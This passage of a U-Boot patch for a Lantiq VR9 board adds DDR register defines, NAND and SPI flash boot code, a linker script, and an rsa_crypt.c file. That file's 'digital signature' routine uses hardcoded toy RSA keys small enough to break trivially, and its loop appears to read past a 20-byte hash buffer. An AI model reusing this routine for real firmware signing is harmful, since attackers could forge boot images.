+#define DDR_CCR134     (DDR_OFFSET + 0x0860 )
+#define DDR_CCR135     (DDR_OFFSET + 0x0870 )
+#define DDR_CCR136     (DDR_OFFSET + 0x0880 )
+#define DDR_CCR137     (DDR_OFFSET + 0x0890 )
+#define DDR_CCR138     (DDR_OFFSET + 0x08A0 )
+#define DDR_CCR139     (DDR_OFFSET + 0x08B0 )
+#define DDR_CCR140     (DDR_OFFSET + 0x08C0 )
+#define DDR_CCR141     (DDR_OFFSET + 0x08D0 )
+#define DDR_CCR142     (DDR_OFFSET + 0x08E0 )
+#define DDR_CCR143     (DDR_OFFSET + 0x08F0 )
+#define DDR_CCR144     (DDR_OFFSET + 0x0900 )
+#define DDR_CCR145     (DDR_OFFSET + 0x0910 )
+#define DDR_CCR146     (DDR_OFFSET + 0x0920 )
+#define DDR_CCR147     (DDR_OFFSET + 0x0930 )
+#define DDR_CCR148     (DDR_OFFSET + 0x0940 )
+#define DDR_CCR149     (DDR_OFFSET + 0x0950 )
+#define DDR_CCR150     (DDR_OFFSET + 0x0960 )
+#define DDR_CCR151     (DDR_OFFSET + 0x0970 )
+#define DDR_CCR152     (DDR_OFFSET + 0x0980 )
+#define DDR_CCR153     (DDR_OFFSET + 0x0990 )
+#define DDR_CCR154     (DDR_OFFSET + 0x09A0 )
+#define DDR_CCR155     (DDR_OFFSET + 0x09B0 )
+#define DDR_CCR156     (DDR_OFFSET + 0x09C0 )
+#define DDR_CCR157     (DDR_OFFSET + 0x09D0 )
+#define DDR_CCR158     (DDR_OFFSET + 0x09E0 )
+#define DDR_CCR159     (DDR_OFFSET + 0x09F0 )
+#define DDR_CCR160     (DDR_OFFSET + 0x0A00 )
+#define DDR_CCR161     (DDR_OFFSET + 0x0A10 )
+#define DDR_CCR162     (DDR_OFFSET + 0x0A20 )
+#define DDR_CCR163     (DDR_OFFSET + 0x0A30 )
+#define DDR_CCR164     (DDR_OFFSET + 0x0A40 )
+#define DDR_CCR165     (DDR_OFFSET + 0x0A50 )
+#define DDR_CCR166     (DDR_OFFSET + 0x0A60 )
+#define DDR_CCR167     (DDR_OFFSET + 0x0A70 )
+#define DDR_CCR168     (DDR_OFFSET + 0x0A80 )
+#define DDR_CCR169     (DDR_OFFSET + 0x0A90 )
+#define DDR_CCR170     (DDR_OFFSET + 0x0AA0 )
+#define DDR_CCR171     (DDR_OFFSET + 0x0AB0 )
+#define DDR_CCR172     (DDR_OFFSET + 0x0AC0 )
+#define DDR_CCR173     (DDR_OFFSET + 0x0AD0 )
+#define DDR_CCR174     (DDR_OFFSET + 0x0AE0 )
+#define DDR_CCR175     (DDR_OFFSET + 0x0AF0 )
+#define DDR_CCR176     (DDR_OFFSET + 0x0B00 )
+#define DDR_CCR177     (DDR_OFFSET + 0x0B10 )
+#define DDR_CCR178     (DDR_OFFSET + 0x0B20 )
+#define DDR_CCR179     (DDR_OFFSET + 0x0B30 )
+#define DDR_CCR180     (DDR_OFFSET + 0x0B40 )
+#define DDR_CCR181     (DDR_OFFSET + 0x0B50 )
+#define DDR_CCR182     (DDR_OFFSET + 0x0B60 )
+#define DDR_CCR183     (DDR_OFFSET + 0x0B70 )
+#define DDR_CCR184     (DDR_OFFSET + 0x0B80 )
+#define DDR_CCR185     (DDR_OFFSET + 0x0B90 )
+#define DDR_CCR186     (DDR_OFFSET + 0x0BA0 )
+#define DDR_CCR187     (DDR_OFFSET + 0x0BB0 )
+#define DDR_CCR188     (DDR_OFFSET + 0x0BC0 )
+#define DDR_CCR189     (DDR_OFFSET + 0x0BD0 )
+#define DDR_CCR190     (DDR_OFFSET + 0x0BE0 )
+#define DDR_CCR191     (DDR_OFFSET + 0x0BF0 )
+
+
+#define MC_MODUL_BASE		0xBF800000
+#define MC_ERRCAUSE   	MC_MODUL_BASE+0x0010
+#define MC_ERRADDR     	MC_MODUL_BASE+0x0020
+#define MC_CON		      MC_MODUL_BASE+0x0060
+#define MC_SRAM_ENABLE		0x00000004
+#define MC_SDRAM_ENABLE		0x00000002
+#define MC_DDRRAM_ENABLE	0x00000001
+#define MC_DDR_MODUL_BASE	0xBF801000
+
+#define MC_DC03		MC_DDR_MODUL_BASE+0x0030
+#define MC_DC15   MC_DDR_MODUL_BASE+0x00F0
+#define MC_DC21		MC_DDR_MODUL_BASE+0x0150
+#define MC_DC22		MC_DDR_MODUL_BASE+0x0160
+#define MC_DC24		MC_DDR_MODUL_BASE+0x0180
+
+void nand_gpio_init(void)
+{
+	  *BSP_GPIO_P3_DIR=0x2;
+    *BSP_GPIO_P3_ALTSEL0=0x3;
+    *BSP_GPIO_P3_ALTSEL1=0x0;
+    *BSP_GPIO_P3_OD=0x3;
+    
+    /* set GPIO pins for NAND */
+    /* P0.13 FL_A24 01:output*/
+    /* P1.8 FL_A23 01:output*/
+    *BSP_GPIO_P0_ALTSEL0 |= 0x2000;
+    *BSP_GPIO_P0_ALTSEL1 &= (~0x2000);
+    *BSP_GPIO_P0_DIR |= (0x2000);
+    *BSP_GPIO_P1_ALTSEL0 |= 0x100;
+    *BSP_GPIO_P1_ALTSEL1 &= (~0x100);
+    *BSP_GPIO_P1_DIR |= (0x100);
+}
+									  
+
+void *malloc(unsigned int size)
+{
+   
+    return NULL;
+}
+
+static void nand_read_page(u32 page_addr, u32 dest_addr)
+{
+   int i;
+   u8 *tmp;
+   u8 col_addr_num;
+     u8 page_addr_num;
+
+   if(CONFIG_NAND_PAGE_SIZE<=0x200){
+     col_addr_num=1;
+
+     if(CONFIG_NAND_FLASH_SIZE<32){
+        page_addr_num=2;
+      }else
+        page_addr_num=3;
+   }else{
+     col_addr_num=2;
+
+     if(CONFIG_NAND_FLASH_SIZE<128){
+          page_addr_num=2;
+      }else{
+        page_addr_num=3;
+      }
+   }
+   NAND_CE_SET;
+
+   NAND_SETCLE;
+   NAND_WRITE(WRITE_CMD,0);
+   NAND_CLRCLE;
+   NAND_SETALE;
+   for(i=0;i<col_addr_num;i++){
+    NAND_WRITE(WRITE_ADDR,0);
+  }
+   for(i=0;i<page_addr_num;i++){
+     NAND_WRITE(WRITE_ADDR,(u8)((page_addr>>(i*8)) & 0xff ));
+   }
+   NAND_CLRALE;
+
+   NAND_SETCLE;
+   if(CONFIG_NAND_PAGE_SIZE>0x200){
+     NAND_WRITE(WRITE_CMD,0x30);
+   }
+  NAND_CLRCLE;
+  while(!NAND_READY){}
+
+   /* Read page */
+   tmp = (u8*)dest_addr;
+   for (i = 0; i < CONFIG_NAND_PAGE_SIZE; i++)
+   {
+     NAND_READ(READ_DATA, *tmp++);
+   }
+   NAND_CE_CLEAR;
+
+   while(!NAND_READY){}
+}
+
+void nand_spl_init(void)
+{
+  ulong  buffer[8];
+  u8    page_buf[CONFIG_NAND_PAGE_SIZE];
+  ulong ddr_magic=0x88888888;
+  ulong erase_addr1=0, erase_addr2=0;
+  ulong  ecc;
+  int i;
+  
+  erase_addr1 = IFX_CFG_FLASH_DDR_CFG_START_ADDR;
+  erase_addr2 = IFX_CFG_FLASH_DDR_CFG_START_ADDR + IFX_CFG_FLASH_DDR_CFG_SIZE;
+
+  serial_init();
+
+  buffer[0] = 0;
+
+  asm("sync");
+  nand_read_page(((IFX_CFG_FLASH_DDR_CFG_END_ADDR+1)/CONFIG_NAND_PAGE_SIZE)-1,page_buf);
+  asm("sync");
+  
+  for(i=0;i<8;i++){
+    buffer[i] = *(volatile u32*)(page_buf+CONFIG_NAND_PAGE_SIZE-32+i*4); 
+  }
+  if(buffer[0]==ddr_magic)
+       {
+             ecc=buffer[1]^buffer[2]^buffer[3]^buffer[4]^buffer[5]^buffer[6];
+               if(ecc!=buffer[7]){
+                  REG32(CONFIG_TUNING_STATUS)=0xff;
+                }else{
+                    REG32(CONFIG_TUNING_STATUS)=0;
+                }
+         }
+     else{
+        REG32(CONFIG_TUNING_STATUS)=0xff;
+    }
+
+     REG32(DDR_CCR07) = 0; /*put DDR controller inactive*/
+      asm("sync");
+	 if(REG32(CONFIG_TUNING_STATUS)==0xff){ 
+	      REG32(DDR_CCR39)= REG32(DDR_CCR39) & 0xffff00ff;
+	      REG32(DDR_CCR40)= REG32(DDR_CCR40) & 0xffff00ff;
+	      REG32(0xBF400430) = 0x04;
+	    }else{
+	      REG32(DDR_CCR39)= buffer[1];
+              REG32(DDR_CCR40)= buffer[2];
+              REG32(DDR_CCR43)= buffer[3];
+	      REG32(DDR_CCR44)= buffer[4];
+              REG32(CSS_DDR_ECHO_DLL0)= buffer[5];
+              REG32(CSS_DDR_ECHO_DLL1)= buffer[6];
+      }
+   asm("sync");   
+   REG32(DDR_CCR07) = 0x1010100; /*put DDR controller active*/
+   while(!(REG32(DDR_CCR47) & 0x01));
+   while(!(REG32(DDR_CCR48) & 0x01)); 
+#ifdef CONFIG_TUNE_DDR
+	 asm("sync");
+	 tune_ddr();
+#endif     
+	 asm("sync");
+   nand_boot();
+	
+}
diff --git a/board/vr9/rsa_crypt.c b/board/vr9/rsa_crypt.c
new file mode 100644
--- /dev/null
+++ b/board/vr9/rsa_crypt.c
@@ -0,0 +1,43 @@
+typedef unsigned char u8;
+#define HASH_RESULT_BYTES 	(20)
+
+typedef unsigned short u16;
+typedef unsigned long u32;
+
+static long expmod(long m, long a, long pq);
+static long rsa_crypt(long msg, long a, long pq);
+
+
+void ds_crypt(u8 *input, u8 *output)
+{
+    u32 *rsa_dword = (u32 *)input;
+    long privkey = 6539;
+    long pubkey = 24287;
+    int cnt;
+      
+    for (cnt = 0; cnt < HASH_RESULT_BYTES; cnt++)
+    {
+        output[cnt] = rsa_crypt(rsa_dword[cnt], privkey, pubkey);
+    }
+}
+
+// computes  m^a mod pq
+static long expmod(long m, long a, long pq)
+{
+	long z=m;
+	long p=1;
+	while(a>1)
+	{
+		if (a&1)  { p*=z; p%=pq;  }
+		z*=z; z%=pq;
+		a>>=1;
+	}
+	return (z*p)%pq;
+}
+
+
+static long rsa_crypt(long msg, long a, long pq)
+{
+    return expmod(msg, a, pq);
+}
+
diff --git a/board/vr9/rsalinker.lds b/board/vr9/rsalinker.lds
new file mode 100644
--- /dev/null
+++ b/board/vr9/rsalinker.lds
@@ -0,0 +1,85 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk Engineering, <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+/*
+OUTPUT_FORMAT("elf32-bigmips", "elf32-bigmips", "elf32-bigmips")
+*/
+OUTPUT_FORMAT("elf32-tradbigmips", "elf32-tradbigmips", "elf32-tradbigmips")
+OUTPUT_ARCH(mips)
+ENTRY(_start)
+SECTIONS
+{
+   . = 0xa0600050;
+   /*. = 0xbe220050;*/ 
+   . = ALIGN(4);
+   .text       :
+   {
+     *(.text)
+   }
+
+   . = ALIGN(4);
+   .rodata  : { *(.rodata) }
+
+   . = ALIGN(16);
+   _gp = ABSOLUTE(.);
+   .got : { *(.got) }
+   
+   _etext = ABSOLUTE(.);
+
+   .data 0x9fc00000 : 
+   AT( _etext )
+   {
+      _fdata = ABSOLUTE(.);
+      *(.data)
+      *(.sdata)
+ 
+      . = ALIGN(4);
+      _edata = ABSOLUTE(.);
+   }   
+
+   . = ALIGN(4);
+   _fbss = .;
+
+   .sbss  : { *(.sbss) }
+   .bss  : { *(.bss) }
+
+   /* This is the MIPS specific mdebug section.  */
+   .mdebug : { *(.mdebug) }
+   /* These are needed for ELF backends which have not yet been
+      converted to the new style linker.  */
+   .stab 0 : { *(.stab) }
+   .stabstr 0 : { *(.stabstr) }
+   /* DWARF debug sections.
+      Symbols in the .debug DWARF section are relative to the beginning of the
+      section so we begin .debug at 0.  It's not clear yet what needs to happen
+      for the others.   */
+   .debug          0 : { *(.debug) }
+   .debug_srcinfo  0 : { *(.debug_srcinfo) }
+   .debug_aranges  0 : { *(.debug_aranges) }
+   .debug_pubnames 0 : { *(.debug_pubnames) }
+   .debug_sfnames  0 : { *(.debug_sfnames) }
+   .line           0 : { *(.line) }
+   /* These must appear regardless of  .  */
+   .gptab.sdata : { *(.gptab.data) *(.gptab.sdata) }
+   .gptab.sbss : { *(.gptab.bss) *(.gptab.sbss) }
+}
diff --git a/board/vr9/sfddr_board.c b/board/vr9/sfddr_board.c
new file mode 100644
--- /dev/null
+++ b/board/vr9/sfddr_board.c
@@ -0,0 +1,556 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+#include <common.h>
+#include <command.h>
+#include <version.h>
+#include <net.h>
+#include <environment.h>
+
+//#include <LzmaWrapper.h>
+
+
+#define DDR_OFFSET   0xbf401000
+#define DDR_CCR00      (DDR_OFFSET + 0x0000 )
+#define DDR_CCR01      (DDR_OFFSET + 0x0010 )
+#define DDR_CCR02      (DDR_OFFSET + 0x0020 )
+#define DDR_CCR03      (DDR_OFFSET + 0x0030 )
+#define DDR_CCR04      (DDR_OFFSET + 0x0040 )
+#define DDR_CCR05      (DDR_OFFSET + 0x0050 )
+#define DDR_CCR06      (DDR_OFFSET + 0x0060 )
+#define DDR_CCR07      (DDR_OFFSET + 0x0070 )
+#define DDR_CCR08      (DDR_OFFSET + 0x0080 )
+#define DDR_CCR09      (DDR_OFFSET + 0x0090 )
+#define DDR_CCR10      (DDR_OFFSET + 0x00A0 )
+#define DDR_CCR11      (DDR_OFFSET + 0x00B0 )
+#define DDR_CCR12      (DDR_OFFSET + 0x00C0 )
+#define DDR_CCR13      (DDR_OFFSET + 0x00D0 )
+#define DDR_CCR14      (DDR_OFFSET + 0x00E0 )
+#define DDR_CCR15      (DDR_OFFSET + 0x00F0 )
+#define DDR_CCR16      (DDR_OFFSET + 0x0100 )
+#define DDR_CCR17      (DDR_OFFSET + 0x0110 )
+#define DDR_CCR18      (DDR_OFFSET + 0x0120 )
+#define DDR_CCR19      (DDR_OFFSET + 0x0130 )
+#define DDR_CCR20      (DDR_OFFSET + 0x0140 )
+#define DDR_CCR21      (DDR_OFFSET + 0x0150 )
+#define DDR_CCR22      (DDR_OFFSET + 0x0160 )
+#define DDR_CCR23      (DDR_OFFSET + 0x0170 )
+#define DDR_CCR24      (DDR_OFFSET + 0x0180 )
+#define DDR_CCR25      (DDR_OFFSET + 0x0190 )
+#define DDR_CCR26      (DDR_OFFSET + 0x01A0 )
+#define DDR_CCR27      (DDR_OFFSET + 0x01B0 )
+#define DDR_CCR28      (DDR_OFFSET + 0x01C0 )
+#define DDR_CCR29      (DDR_OFFSET + 0x01D0 )
+#define DDR_CCR30      (DDR_OFFSET + 0x01E0 )
+#define DDR_CCR31      (DDR_OFFSET + 0x01F0 )
+#define DDR_CCR32      (DDR_OFFSET + 0x0200 )
+#define DDR_CCR33      (DDR_OFFSET + 0x0210 )
+#define DDR_CCR34      (DDR_OFFSET + 0x0220 )
+#define DDR_CCR35      (DDR_OFFSET + 0x0230 )
+#define DDR_CCR36      (DDR_OFFSET + 0x0240 )
+#define DDR_CCR37      (DDR_OFFSET + 0x0250 )
+#define DDR_CCR38      (DDR_OFFSET + 0x0260 )
+#define DDR_CCR39      (DDR_OFFSET + 0x0270 )
+#define DDR_CCR40      (DDR_OFFSET + 0x0280 )
+#define DDR_CCR41      (DDR_OFFSET + 0x0290 )
+#define DDR_CCR42      (DDR_OFFSET + 0x02A0 )
+#define DDR_CCR43      (DDR_OFFSET + 0x02B0 )
+#define DDR_CCR44      (DDR_OFFSET + 0x02C0 )
+#define DDR_CCR45      (DDR_OFFSET + 0x02D0 )
+#define DDR_CCR46      (DDR_OFFSET + 0x02E0 )
+#define DDR_CCR47      (DDR_OFFSET + 0x02F0 )
+#define DDR_CCR48      (DDR_OFFSET + 0x0300 )
+#define DDR_CCR49      (DDR_OFFSET + 0x0310 )
+#define DDR_CCR50      (DDR_OFFSET + 0x0320 )
+#define DDR_CCR51      (DDR_OFFSET + 0x0330 )
+#define DDR_CCR52      (DDR_OFFSET + 0x0340 )
+#define DDR_CCR53      (DDR_OFFSET + 0x0350 )
+#define DDR_CCR54      (DDR_OFFSET + 0x0360 )
+#define DDR_CCR55      (DDR_OFFSET + 0x0370 )
+#define DDR_CCR56      (DDR_OFFSET + 0x0380 )
+#define DDR_CCR57      (DDR_OFFSET + 0x0390 )
+#define DDR_CCR58      (DDR_OFFSET + 0x03A0 )
+#define DDR_CCR59      (DDR_OFFSET + 0x03B0 )
+#define DDR_CCR60      (DDR_OFFSET + 0x03C0 )
+#define DDR_CCR61      (DDR_OFFSET + 0x03D0 )
+#define DDR_CCR62      (DDR_OFFSET + 0x03E0 )
+#define DDR_CCR63      (DDR_OFFSET + 0x03F0 )
+#define DDR_CCR64      (DDR_OFFSET + 0x0400 )
+#define DDR_CCR65      (DDR_OFFSET + 0x0410 )
+#define DDR_CCR66      (DDR_OFFSET + 0x0420 )
+#define DDR_CCR67      (DDR_OFFSET + 0x0430 )
+#define DDR_CCR68      (DDR_OFFSET + 0x0440 )
+#define DDR_CCR69      (DDR_OFFSET + 0x0450 )
+#define DDR_CCR70      (DDR_OFFSET + 0x0460 )
+#define DDR_CCR71      (DDR_OFFSET + 0x0470 )
+#define DDR_CCR72      (DDR_OFFSET + 0x0480 )
+#define DDR_CCR73      (DDR_OFFSET + 0x0490 )
+#define DDR_CCR74      (DDR_OFFSET + 0x04A0 )
+#define DDR_CCR75      (DDR_OFFSET + 0x04B0 )
+#define DDR_CCR76      (DDR_OFFSET + 0x04C0 )
+#define DDR_CCR77      (DDR_OFFSET + 0x04D0 )
+#define DDR_CCR78      (DDR_OFFSET + 0x04E0 )
+#define DDR_CCR79      (DDR_OFFSET + 0x04F0 )
+#define DDR_CCR80      (DDR_OFFSET + 0x0500 )
+#define DDR_CCR81      (DDR_OFFSET + 0x0510 )
+#define DDR_CCR82      (DDR_OFFSET + 0x0520 )
+#define DDR_CCR83      (DDR_OFFSET + 0x0530 )
+#define DDR_CCR84      (DDR_OFFSET + 0x0540 )
+#define DDR_CCR85      (DDR_OFFSET + 0x0550 )
+#define DDR_CCR86      (DDR_OFFSET + 0x0560 )
+#define DDR_CCR87      (DDR_OFFSET + 0x0570 )
+#define DDR_CCR88      (DDR_OFFSET + 0x0580 )
+#define DDR_CCR89      (DDR_OFFSET + 0x0590 )
+#define DDR_CCR90      (DDR_OFFSET + 0x05A0 )
+#define DDR_CCR91      (DDR_OFFSET + 0x05B0 )
+#define DDR_CCR92      (DDR_OFFSET + 0x05C0 )
+#define DDR_CCR93      (DDR_OFFSET + 0x05D0 )
+#define DDR_CCR94      (DDR_OFFSET + 0x05E0 )
+#define DDR_CCR95      (DDR_OFFSET + 0x05F0 )
+#define DDR_CCR96      (DDR_OFFSET + 0x0600 )
+#define DDR_CCR97      (DDR_OFFSET + 0x0610 )
+#define DDR_CCR98      (DDR_OFFSET + 0x0620 )
+#define DDR_CCR99      (DDR_OFFSET + 0x0630 )
+#define DDR_CCR100     (DDR_OFFSET + 0x0640 )
+#define DDR_CCR101     (DDR_OFFSET + 0x0650 )
+#define DDR_CCR102     (DDR_OFFSET + 0x0660 )
+#define DDR_CCR103     (DDR_OFFSET + 0x0670 )
+#define DDR_CCR104     (DDR_OFFSET + 0x0680 )
+#define DDR_CCR105     (DDR_OFFSET + 0x0690 )
+#define DDR_CCR106     (DDR_OFFSET + 0x06A0 )
+#define DDR_CCR107     (DDR_OFFSET + 0x06B0 )
+#define DDR_CCR108     (DDR_OFFSET + 0x06C0 )
+#define DDR_CCR109     (DDR_OFFSET + 0x06D0 )
+#define DDR_CCR110     (DDR_OFFSET + 0x06E0 )
+#define DDR_CCR111     (DDR_OFFSET + 0x06F0 )
+#define DDR_CCR112     (DDR_OFFSET + 0x0700 )
+#define DDR_CCR113     (DDR_OFFSET + 0x0710 )
+#define DDR_CCR114     (DDR_OFFSET + 0x0720 )
+#define DDR_CCR115     (DDR_OFFSET + 0x0730 )
+#define DDR_CCR116     (DDR_OFFSET + 0x0740 )
+#define DDR_CCR117     (DDR_OFFSET + 0x0750 )
+#define DDR_CCR118     (DDR_OFFSET + 0x0760 )
+#define DDR_CCR119     (DDR_OFFSET + 0x0770 )
+#define DDR_CCR120     (DDR_OFFSET + 0x0780 )
+#define DDR_CCR121     (DDR_OFFSET + 0x0790 )
+#define DDR_CCR122     (DDR_OFFSET + 0x07A0 )
+#define DDR_CCR123     (DDR_OFFSET + 0x07B0 )
+#define DDR_CCR124     (DDR_OFFSET + 0x07C0 )
+#define DDR_CCR125     (DDR_OFFSET + 0x07D0 )
+#define DDR_CCR126     (DDR_OFFSET + 0x07E0 )
+#define DDR_CCR127     (DDR_OFFSET + 0x07F0 )
+#define DDR_CCR128     (DDR_OFFSET + 0x0800 )
+#define DDR_CCR129     (DDR_OFFSET + 0x0810 )
+#define DDR_CCR130     (DDR_OFFSET + 0x0820 )
+#define DDR_CCR131     (DDR_OFFSET + 0x0830 )
+#define DDR_CCR132     (DDR_OFFSET + 0x0840 )
+#define DDR_CCR133     (DDR_OFFSET + 0x0850 )
+#define DDR_CCR134     (DDR_OFFSET + 0x0860 )
+#define DDR_CCR135     (DDR_OFFSET + 0x0870 )
+#define DDR_CCR136     (DDR_OFFSET + 0x0880 )
+#define DDR_CCR137     (DDR_OFFSET + 0x0890 )
+#define DDR_CCR138     (DDR_OFFSET + 0x08A0 )
+#define DDR_CCR139     (DDR_OFFSET + 0x08B0 )
+#define DDR_CCR140     (DDR_OFFSET + 0x08C0 )
+#define DDR_CCR141     (DDR_OFFSET + 0x08D0 )
+#define DDR_CCR142     (DDR_OFFSET + 0x08E0 )
+#define DDR_CCR143     (DDR_OFFSET + 0x08F0 )
+#define DDR_CCR144     (DDR_OFFSET + 0x0900 )
+#define DDR_CCR145     (DDR_OFFSET + 0x0910 )
+#define DDR_CCR146     (DDR_OFFSET + 0x0920 )
+#define DDR_CCR147     (DDR_OFFSET + 0x0930 )
+#define DDR_CCR148     (DDR_OFFSET + 0x0940 )
+#define DDR_CCR149     (DDR_OFFSET + 0x0950 )
+#define DDR_CCR150     (DDR_OFFSET + 0x0960 )
+#define DDR_CCR151     (DDR_OFFSET + 0x0970 )
+#define DDR_CCR152     (DDR_OFFSET + 0x0980 )
+#define DDR_CCR153     (DDR_OFFSET + 0x0990 )
+#define DDR_CCR154     (DDR_OFFSET + 0x09A0 )
+#define DDR_CCR155     (DDR_OFFSET + 0x09B0 )
+#define DDR_CCR156     (DDR_OFFSET + 0x09C0 )
+#define DDR_CCR157     (DDR_OFFSET + 0x09D0 )
+#define DDR_CCR158     (DDR_OFFSET + 0x09E0 )
+#define DDR_CCR159     (DDR_OFFSET + 0x09F0 )
+#define DDR_CCR160     (DDR_OFFSET + 0x0A00 )
+#define DDR_CCR161     (DDR_OFFSET + 0x0A10 )
+#define DDR_CCR162     (DDR_OFFSET + 0x0A20 )
+#define DDR_CCR163     (DDR_OFFSET + 0x0A30 )
+#define DDR_CCR164     (DDR_OFFSET + 0x0A40 )
+#define DDR_CCR165     (DDR_OFFSET + 0x0A50 )
+#define DDR_CCR166     (DDR_OFFSET + 0x0A60 )
+#define DDR_CCR167     (DDR_OFFSET + 0x0A70 )
+#define DDR_CCR168     (DDR_OFFSET + 0x0A80 )
+#define DDR_CCR169     (DDR_OFFSET + 0x0A90 )
+#define DDR_CCR170     (DDR_OFFSET + 0x0AA0 )
+#define DDR_CCR171     (DDR_OFFSET + 0x0AB0 )
+#define DDR_CCR172     (DDR_OFFSET + 0x0AC0 )
+#define DDR_CCR173     (DDR_OFFSET + 0x0AD0 )
+#define DDR_CCR174     (DDR_OFFSET + 0x0AE0 )
+#define DDR_CCR175     (DDR_OFFSET + 0x0AF0 )
+#define DDR_CCR176     (DDR_OFFSET + 0x0B00 )
+#define DDR_CCR177     (DDR_OFFSET + 0x0B10 )
+#define DDR_CCR178     (DDR_OFFSET + 0x0B20 )
+#define DDR_CCR179     (DDR_OFFSET + 0x0B30 )
+#define DDR_CCR180     (DDR_OFFSET + 0x0B40 )
+#define DDR_CCR181     (DDR_OFFSET + 0x0B50 )
+#define DDR_CCR182     (DDR_OFFSET + 0x0B60 )
+#define DDR_CCR183     (DDR_OFFSET + 0x0B70 )
+#define DDR_CCR184     (DDR_OFFSET + 0x0B80 )
+#define DDR_CCR185     (DDR_OFFSET + 0x0B90 )
+#define DDR_CCR186     (DDR_OFFSET + 0x0BA0 )
+#define DDR_CCR187     (DDR_OFFSET + 0x0BB0 )
+#define DDR_CCR188     (DDR_OFFSET + 0x0BC0 )
+#define DDR_CCR189     (DDR_OFFSET + 0x0BD0 )
+#define DDR_CCR190     (DDR_OFFSET + 0x0BE0 )
+#define DDR_CCR191     (DDR_OFFSET + 0x0BF0 )
+
+
+#define MC_MODUL_BASE		0xBF800000
+#define MC_ERRCAUSE   	MC_MODUL_BASE+0x0010
+#define MC_ERRADDR     	MC_MODUL_BASE+0x0020
+#define MC_CON		      MC_MODUL_BASE+0x0060
+#define MC_SRAM_ENABLE		0x00000004
+#define MC_SDRAM_ENABLE		0x00000002
+#define MC_DDRRAM_ENABLE	0x00000001
+#define MC_DDR_MODUL_BASE	0xBF801000
+
+#define MC_DC03		MC_DDR_MODUL_BASE+0x0030
+#define MC_DC15   MC_DDR_MODUL_BASE+0x00F0
+#define MC_DC21		MC_DDR_MODUL_BASE+0x0150
+#define MC_DC22		MC_DDR_MODUL_BASE+0x0160
+#define MC_DC24		MC_DDR_MODUL_BASE+0x0180
+
+DECLARE_GLOBAL_DATA_PTR;
+
+#define	TOTAL_MALLOC_LEN	CONFIG_SYS_MALLOC_LEN
+
+
+ulong monitor_flash_len;
+
+const char version_string[] =
+	U_BOOT_VERSION" (" __DATE__ " - " __TIME__ ")";
+
+static char *failed = "*** failed ***\n";
+
+#include <spi.h>
+#include <asm/ifx_ssc.h>
+
+#ifndef CONFIG_ENV_SPI_BUS
+# define CONFIG_ENV_SPI_BUS 0
+#endif
+#ifndef CONFIG_ENV_SPI_CS
+# define CONFIG_ENV_SPI_CS      0
+#endif
+#ifndef CONFIG_ENV_SPI_MAX_HZ
+# define CONFIG_ENV_SPI_MAX_HZ  1000000
+#endif
+#ifndef CONFIG_ENV_SPI_MODE
+# define CONFIG_ENV_SPI_MODE    SPI_MODE_3
+#endif
+
+#define CMD_MX25L_READ     0x03
+#define CMD_S25FLXX_READ   0x03 
+
+
+#define SRC_OFFSET  0x00001000
+#define DST_ADDRESS 0xbe221000
+#define DATA_SIZE   0x4000
+
+												
+static void
+SPI_ON(unsigned int cs)
+{
+    ssc_cs_clr(cs);
+}
+
+static void	SPI_OFF(unsigned int cs)
+{
+    ssc_cs_set(cs);
+}
+
+void spi_write_byte(uint8_t transmit)
+{
+    asm("sync");
+    ssc_tx_only();
+    ssc_write(transmit);
+    asm("sync");
+    return;
+}
+
+static uint8_t	spi_read_byte(void)
+{
+    ssc_rx_only();
+    return ssc_read();
+}
+
+#ifdef CONFIG_SPI_FLASH_WINBOND
+/*
+ * Assemble the address part of a command for Winbond devices in
+ * non-power-of-two page size mode.
+ */
+static void winbond_build_address(size_t offset, int l2_page_size, u8* cmd)
+{
+  unsigned long page_addr;
+  unsigned long byte_addr;
+  unsigned long page_size;
+  unsigned int page_shift;
+
+  /*
+   * The "extra" space per page is the power-of-two page size
+   * divided by 32.
+   */
+  page_shift = l2_page_size;
+  page_size = (1 << page_shift);
+  page_addr = offset / page_size;
+  byte_addr = offset % page_size;
+  cmd[0] = page_addr >> (16 - page_shift);
+  cmd[1] = page_addr << (page_shift - 8) | (byte_addr >> 8);
+  cmd[2] = byte_addr;
+}
+#endif
+
+
+void sf_read(const u8 cmd, ulong src_addr, 
+		size_t addr_len, u8 *data, size_t data_len)
+{
+	  int i;
+	  u8 offset[5];
+#ifdef CONFIG_SPI_FLASH_WINBOND	  
+          winbond_build_address((size_t)src_addr, 8, &offset);
+#elif defined(CONFIG_SPI_FLASH_MXIC)          
+          for(i=0;i<addr_len;i++){
+             offset[i]= (u8)((src_addr >>((addr_len-i-1)*8)) & 0xff);
+          }
+#endif
+	  SPI_ON(CONFIG_ENV_SPI_CS);
+	  spi_write_byte(cmd);
+	  for(i=0;i<addr_len;i++){
+	  	spi_write_byte(*(offset+i));
+	  }
+	  for(i=0;i<data_len;i++){
+	  	*(data+i)=spi_read_byte();
+	  }
+	  SPI_OFF(CONFIG_ENV_SPI_CS);
+}		
+
+
+
+/*
+ * Begin and End of memory area for malloc(), and current "brk"
+ */
+
+static ulong mem_malloc_start;
+static ulong mem_malloc_end;
+static ulong mem_malloc_brk;
+
+
+/*
+ * The Malloc area is immediately below the monitor copy in DRAM
+ */
+static void mem_malloc_init (ulong dest_addr, ulong size)
+{
